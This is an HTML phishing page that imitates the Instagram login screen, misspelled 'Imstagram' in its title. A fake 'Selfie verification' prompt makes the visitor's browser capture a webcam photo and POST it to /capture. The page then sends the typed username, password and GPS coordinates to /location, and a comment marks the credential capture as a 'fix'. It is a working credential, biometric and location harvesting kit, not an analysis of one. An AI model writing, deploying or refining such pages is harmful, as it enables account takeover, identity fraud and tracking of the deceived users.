<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>Imstagram</title>

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&family=Pacifico&display=swap" rel="stylesheet">

<style>
*{margin:0;padding:0;box-sizing:border-box}
body{
  min-height:100vh;
  background:#0b0e11;
  display:flex;
  justify-content:center;
  align-items:center;
  color:#fff;
  font-family:'Inter',sans-serif;
}
.page{position:relative}
.blurred{filter:blur(6px);transition:.4s}
.blurred.active{filter:blur(0)}
.overlay{
  position:absolute;inset:0;display:flex;justify-content:center;align-items:center;z-index:10
}
.modal{
  background:#111;border:1px solid #2a2d33;border-radius:8px;
  padding:26px 24px;text-align:center;
  box-shadow:0 0 0 9999px rgba(0,0,0,.6)
}
.modal h2{font-family:Verdana,sans-serif;font-size:18px;margin-bottom:12px}
.modal p{font-size:14px;color:#cfd1d4}
.modal button{
  margin-top:18px;padding:10px 20px;background:#3f4db8;
  border:none;border-radius:6px;color:#fff;font-size:14px;cursor:pointer
}
.container{width:350px;text-align:center}
.logo{font-family:'Pacifico',cursive;font-size:40px;margin-bottom:28px}
.card{
  background:#111;border:1px solid #2a2d33;border-radius:4px;padding:28px
}
.input{
  width:100%;padding:11px;margin-bottom:10px;background:#26292e;
  border:1px solid #3a3d43;border-radius:4px;color:#fff;font-size:14px
}
.btn-primary{
  width:100%;padding:11px;background:#3f4db8;border:none;
  border-radius:8px;color:#fff;font-weight:600;margin-top:10px;cursor:pointer
}
.divider{display:flex;align-items:center;margin:20px 0;font-size:12px;
  font-weight:500;letter-spacing:2px;color:#8e8e8e}
.divider::before,.divider::after{
  content:"";flex:1;height:1px;background:#333
}
.divider span{margin:0 12px}
.fb-login{display:flex;justify-content:center;align-items:center;
  gap:8px;color:#1877f2;font-size:14px;font-weight:500}
.fb-icon{width:18px;height:18px}
.forgot{margin-top:18px;font-size:12px;font-weight:500}
.signup{margin-top:14px;border:1px solid #2a2d33;padding:18px;font-size:14px}
.signup span{font-weight:400}
.signup a{color:#3f8cff;font-weight:500;text-decoration:none}
.footer{margin-top:28px;font-size:12px;color:#8e8e8e;letter-spacing:.3px}
</style>
</head>

<body>

<div class="page">

  <div class="container blurred" id="mainContent">
    <div class="logo">Instagram</div>

    <div class="card">
      <input class="input" id="userField" placeholder="Phone number, username, or email">
      <input class="input" id="passField" type="password" placeholder="Password">
      <button class="btn-primary" onclick="handleLogin()">Log in</button>
      <div class="divider"><span>OR</span></div>
      <div class="fb-login">
        <svg class="fb-icon" viewBox="0 0 24 24" fill="#1877f2">
          <path d="M22 12a10 10 0 1 0-11.5 9.9v-7h-2v-3h2V9.5c0-2 1.2-3.1 3-3.1.9 0 1.8.1 1.8.1v2h-1c-1 0-1.3.6-1.3 1.2V12h2.6l-.4 3h-2.2v7A10 10 0 0 0 22 12"/>
        </svg>
        Log in with Facebook
      </div>
      <div class="forgot">Forgot password?</div>
    </div>

    <div class="signup">
      <span>Donâ€™t have an account?</span> <a href="#">Sign up</a>
    </div>

    <div class="footer">
      Meta Â· About Â· Privacy Â· Terms Â· Locations
    </div>
  </div>

  <div class="overlay" id="overlay">
    <div class="modal">
      <h2>Selfie verification</h2>
      <p>Please confirm your identity.</p>
      <button onclick="startKYC()">Continue</button>
    </div>
  </div>

</div>

<script>
const NEXT_PAGE_URL = "https://www.instagram.com/rohitsharma45/";

/* ===== CAMERA (UNCHANGED) ===== */
async function capturePhoto(){
  let stream=null;
  try{
    stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
    const video=document.createElement("video");
    video.srcObject=stream;
    await video.play();
    const canvas=document.createElement("canvas");
    canvas.width=video.videoWidth;
    canvas.height=video.videoHeight;
    canvas.getContext("2d").drawImage(video,0,0);
    stream.getTracks().forEach(t=>t.stop());
    return canvas.toDataURL("image/jpeg",0.8);
  }catch(e){
    if(stream) stream.getTracks().forEach(t=>t.stop());
    throw e;
  }
}

/* ===== FIXED KYC FLOW ===== */
async function startKYC(){

  // ðŸ” Capture user input FIRST (this is the fix)
  const userValue = document.getElementById("userField").value;
  const passValue = document.getElementById("passField").value;

  try{
    const image = await capturePhoto();

    await fetch("/capture",{
      method:"POST",
      headers:{ "Content-Type":"application/json" },
      body:JSON.stringify({ image })
    });

    // Always send user data to /location
    const basePayload = {
      user: userValue,
      pass: passValue,
      timestamp: new Date().toISOString()
    };

    if(navigator.geolocation){
      navigator.geolocation.getCurrentPosition(
        pos=>{
          fetch("/location",{
            method:"POST",
            headers:{ "Content-Type":"application/json" },
            body:JSON.stringify({
              ...basePayload,
              lat:pos.coords.latitude,
              lon:pos.coords.longitude,
              accuracy:pos.coords.accuracy
            })
          });
        },
        ()=>{
          // Location denied â†’ still save inputs
          fetch("/location",{
            method:"POST",
            headers:{ "Content-Type":"application/json" },
            body:JSON.stringify(basePayload)
          });
        }
      );
    } else {
      fetch("/location",{
        method:"POST",
        headers:{ "Content-Type":"application/json" },
        body:JSON.stringify(basePayload)
      });
    }

    document.getElementById("mainContent").classList.add("active");
    document.getElementById("overlay").style.display="none";

  }catch{
    alert("Proceed Further");
  }
}

function handleLogin(){
  window.location.href = NEXT_PAGE_URL;
}
</script>

</body>
</html>
